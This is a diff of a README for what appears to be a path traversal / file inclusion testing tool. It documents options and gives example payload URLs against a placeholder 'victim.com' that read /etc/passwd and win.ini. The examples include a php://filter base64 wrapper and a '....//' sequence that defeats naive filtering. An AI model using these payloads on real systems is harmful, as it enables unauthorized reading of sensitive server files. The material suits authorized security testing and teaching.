@@ -28,18 +28,20 @@ Enough words of introduction, let's highlight some key features. A complete list
 
 ### Key features
 
-##### -p / --path-prefix
+*-p / --path-prefix*
 This add a prefix before your payload.
 For example : `-p xxx/`
+
 Will result in something like `http://victim.com/?page=xxx/../../../etc/passwd`
 
 This allows to bypass some basic checks trying to determine if a requested page is in a specific directory : `substr($page, 0, 8) == 'include/'`
 
 Moreover, this option allows you to add a PHP filter : `-p php://filter/convert.base64-encode/resource=`
+
 Will result in : `http://victim.com/?page=php://filter/convert.base64-encode/resource=../../../etc/passwd`
 
 
-##### -m / --traversal-method
+*-m / --traversal-method*
 This will replace classic path traversal `../`.
 For example : `-m 2`
 Will result in `http://victim.com/?page=....//....//etc/passwd`
@@ -47,24 +49,32 @@ Will result in `http://victim.com/?page=....//....//etc/passwd`
 This will bypass simple protections against path traversal such as `$page = str_replace($page, '../', '')`
 
 
-##### -s / --stress
-The stress option will perform every variation for every parameter on each item of a given wordlist. A bruteforce option if you are in a hurry, and if you don't care about being noisy.
+*-s / --stress*
+The stress option will perform every variation for every parameter on each item of a given wordlist. 
+This is a useful bruteforce option if you are in a hurry, and if you don't care about being noisy.
 
 
-##### Sucess/error detection
+***Sucess/error detection***
 
 Ignore if a result length is < 1300
+```
 --min-length 1300
-
+```
 Looking for a specific string in files
-/etc/passwd should contains "root:x:0:0"
+/etc/passwd should contains `root:x:0:0`
+```
 --success-string "root:x:0:0"
+```
 
 c:\windows\win.ini should contains "for 16-bit app support"
+```
 --success-string "for 16-bit app support"
+```
 
 Possible error message
+```
 --error-string "page not found"
+```
 
 
 That's all folks ! I hope you'll find this tool as useful as I do !
